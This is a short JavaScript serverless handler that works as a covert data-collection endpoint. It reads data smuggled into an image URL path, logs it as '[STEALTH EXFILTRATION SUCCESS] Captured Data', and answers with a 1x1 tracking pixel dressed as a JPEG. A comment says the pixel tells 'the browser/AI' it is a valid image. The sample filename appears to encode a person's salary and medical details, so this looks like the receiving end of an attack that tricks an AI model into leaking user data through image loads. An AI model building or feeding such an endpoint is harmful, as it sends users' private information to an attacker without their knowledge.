export default function handler(req, res) {
    // The slug will be an array of path segments. We want the last one (the filename).
    const { slug } = req.query;
    
    if (slug && slug.length > 0) {
        const filename = slug[slug.length - 1];
        // The filename looks like "header-Alex-500k-88-X-RAY.jpg"
        console.log(`[STEALTH EXFILTRATION SUCCESS] Captured Data via Path: ${filename}`);
    }

    // Return a 1x1 transparent tracking pixel image (valid binary JPG/GIF data)
    const pixel = Buffer.from('R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==', 'base64');
    
    // We tell the browser/AI it's a valid image
    res.setHeader('Content-Type', 'image/jpeg');
    res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
    res.setHeader('Pragma', 'no-cache');
    res.setHeader('Expires', '0');
    res.status(200).send(pixel);
}
